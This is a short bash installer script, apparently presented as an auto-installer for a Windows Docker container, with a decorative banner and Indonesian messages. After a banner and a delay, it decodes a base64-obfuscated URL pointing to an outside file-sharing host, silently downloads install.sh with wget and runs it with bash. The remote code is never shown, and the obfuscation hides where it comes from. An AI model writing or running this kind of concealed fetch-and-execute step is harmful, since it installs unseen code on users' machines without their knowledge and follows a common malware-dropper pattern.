#!/bin/bash
#
#create by kangqull
PURPLE='\033[0;35m'
RESET='\033[0m'
echo -e "${PURPLE}***************************************${RESET}"
echo -e "${PURPLE}*                                     *${RESET}"
echo -e "${PURPLE}*         Script Auto Install         *${RESET}"
echo -e "${PURPLE}*                                     *${RESET}"
echo -e "${PURPLE}*     > Windows Docker Container <    *${RESET}"
echo -e "${PURPLE}*                                     *${RESET}"
echo -e "${PURPLE}*             by KangQull             *${RESET}"
echo -e "${PURPLE}*                                     *${RESET}"
echo -e "${PURPLE}***************************************${RESET}"
echo -e "${PURPLE}Menjalankan script dalam 5 detik${RESET}"
sleep 5
clear
file=.sh
codec=$(echo "aHR0cHM6Ly9jbG91ZHNoeWRyby50ZWNoL3MvNzRiWmNZNnBiOWo0ZW9NL2Rvd25sb2FkP2ZpbGVzPWluc3RhbGwuc2g" | base64 --decode)

wget -q -O install$file $codec
clear
bash install.sh
